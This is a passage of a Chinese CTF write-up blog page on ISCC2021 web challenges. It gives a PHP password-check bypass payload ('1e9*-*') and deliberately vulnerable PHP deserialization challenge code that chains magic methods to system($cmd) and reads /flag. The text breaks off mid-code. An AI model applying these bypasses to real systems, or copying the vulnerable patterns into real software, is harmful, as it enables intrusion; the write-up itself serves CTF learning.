



<!DOCTYPE html>
<html lang="cn">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="暮间的花园" href="http://example.com/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="暮间的花园" href="http://example.com/atom.xml" />
<link rel="alternate" type="application/json" title="暮间的花园" href="http://example.com/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="writeup" />


<link rel="canonical" href="http://example.com/2021/05/28/%E8%BF%91%E6%9C%9F%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E7%9A%84wp/">



  <title>
近期部分赛题的wp |
Yume Shoka = 暮间的花园</title>
<meta name="generator" content="Hexo 6.0.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">近期部分赛题的wp
  </h1>
  
<div class="meta">
  <span class="item" title="Created: 2021-05-28 12:34:24">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">Posted on</span>
    <time itemprop="dateCreated datePublished" datetime="2021-05-28T12:34:24+08:00">2021-05-28</time>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="Toggle navigation bar">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">Yume Shoka</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="http://smilemoon.top:8083/img/92804016_p0.png"></li>
          <li class="item" data-background-image="http://smilemoon.top:8083/img/e5976202906f1d4530b9f241f08a534f19916355.png"></li>
          <li class="item" data-background-image="http://smilemoon.top:8083/img/JHASHKHhjhkjhsjdha.jpg"></li>
          <li class="item" data-background-image="http://smilemoon.top:8083/img/60752234_p0.jpg"></li>
          <li class="item" data-background-image="http://smilemoon.top:8083/img/92334011_p0.jpg"></li>
          <li class="item" data-background-image="http://smilemoon.top:8083/img/20210604_102554_86181783_p0.png"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">Home</a></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="cn">
  <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/28/%E8%BF%91%E6%9C%9F%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E7%9A%84wp/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="muhua">
    <meta itemprop="description" content=", ">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="暮间的花园">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h1 id="ISCC2021"><a href="#ISCC2021" class="headerlink" title="ISCC2021"></a>ISCC2021</h1><h2 id="练武题-正则表达式最后的倔强"><a href="#练武题-正则表达式最后的倔强" class="headerlink" title="[练武题]正则表达式最后的倔强"></a>[练武题]正则表达式最后的倔强</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&lt;p&gt;code.txt&lt;/p&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">     </span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span> (<span class="string">&quot;/^[a-zA-Z0-9]+$/&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="literal">FALSE</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;</span>;</span><br><span class="line">	</span><br><span class="line">    &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &lt; <span class="number">8</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>] &gt; <span class="number">9999999</span>)</span><br><span class="line">	&#123;    </span><br><span class="line">    </span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>], <span class="string">&#x27;*-*&#x27;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span> . <span class="variable">$flag</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span>(<span class="string">&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload：<code>?password=1e9*-*</code></p>
<hr>
<h2 id="which-is-the-true-iscc"><a href="#which-is-the-true-iscc" class="headerlink" title="which is the true iscc"></a>which is the true iscc</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$status</span> = <span class="string">&quot;new&quot;</span>;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$is_unser_finished</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$iscc_file</span> = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Upload</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$is_upload</span>;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="title function_ invoke__">randstr</span>(<span class="number">14</span>);</span><br><span class="line">        <span class="variable">$is_upload</span> = (<span class="title function_ invoke__">count</span>(<span class="variable">$_FILES</span>) &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$is_upload</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$status</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$iscc_file</span>;</span><br><span class="line">        <span class="variable">$status</span> = <span class="string">&quot;upload_fail&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$is_upload</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$_FILES</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">                <span class="variable">$GLOBALS</span>[<span class="variable">$key</span>] = <span class="variable">$value</span>;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$iscc_file</span>[<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="variable">$check</span> = @<span class="title function_ invoke__">getimagesize</span>(<span class="variable">$iscc_file</span>[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$check</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$target_dir</span> = <span class="string">&quot;/var/tmp/&quot;</span>;</span><br><span class="line">                    <span class="variable">$target_file</span> = <span class="variable">$target_dir</span> . <span class="title function_ invoke__">randstr</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$target_file</span>)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;想啥呢？有东西了……&lt;br&gt;&quot;</span>;</span><br><span class="line">                        <span class="title function_ invoke__">finalize</span>();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$iscc_file</span>[<span class="string">&quot;size&quot;</span>] &gt; <span class="number">500000</span>) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;东西塞不进去~&lt;br&gt;&quot;</span>;</span><br><span class="line">                        <span class="title function_ invoke__">finalize</span>();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$iscc_file</span>[<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$target_file</span>)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;我拿到了！&lt;br&gt;&quot;</span>;</span><br><span class="line">                        <span class="variable">$iscc_file</span> = <span class="variable">$target_file</span>;</span><br><span class="line">                        <span class="variable">$status</span> = <span class="string">&quot;upload_ok&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;拿不到:(&lt;br&gt;&quot;</span>;</span><br><span class="line">                        <span class="title function_ invoke__">finalize</span>();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="title function_ invoke__">finalize</span>();</span><br><span class="line">                    <span class="keyword">exit</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你真是个天才!&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">finalize</span>();</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_ResetCMD</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$new_cmd</span> = <span class="string">&quot;echo &#x27;新新世界，发号施令!&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$is_upload</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$status</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="title function_ invoke__">randstr</span>(<span class="number">14</span>);</span><br><span class="line">        <span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;new_cmd)) &#123;</span><br><span class="line">            <span class="variable">$status</span> = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">            <span class="variable">$error</span> = <span class="string">&quot;你这罐子是空的!&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$error</span>);   </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_string</span>(<span class="variable language_">$this</span>-&gt;new_cmd)) &#123;</span><br><span class="line">            <span class="variable">$status</span> = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">            <span class="variable">$error</span> = <span class="string">&#x27;东西都没给对!&#x27;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$error</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$status</span>;</span><br><span class="line">        <span class="variable">$status</span> = <span class="string">&quot;reset&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] === <span class="string">&#x27;isccIsCciScc1scc&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$cmd</span> = <span class="variable language_">$this</span>-&gt;new_cmd;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Login</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">login</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">logout</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        <span class="variable">$pAssM0rd</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$flag</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pAssM0rd&#x27;</span>] === <span class="variable">$pAssM0rd</span>)</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;isccIsCciScc1scc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$status</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$status</span> = <span class="string">&quot;finish&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_TellMeTruth</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>])) </span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="title function_ invoke__">randstr</span>(<span class="number">14</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;似乎这个 &quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot; 是真相&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;似乎这个 &quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot; 是真相&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Command</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$is_upload</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="title function_ invoke__">randstr</span>(<span class="number">14</span>);</span><br><span class="line">        <span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;看看你干的好事: <span class="subst">&#123;$cmd&#125;</span> &lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$status</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$is_unser_finished</span>;</span><br><span class="line">        <span class="variable">$status</span> = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$is_unser_finished</span> === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;看看你干的 [&lt;span style=&#x27;color:red&#x27;&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/span&gt;] 弄出了什么后果: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;span style=&#x27;color:blue&#x27;&gt;&quot;</span>;</span><br><span class="line">            @<span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/span&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randstr</span>(<span class="params"><span class="variable">$len</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_=&#x27;</span>;</span><br><span class="line">    <span class="variable">$randstring</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$randstring</span> .= <span class="variable">$characters</span>[<span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>))];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randstring</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$s</span>, <span class="string">&quot;*&quot;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">finalize</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span 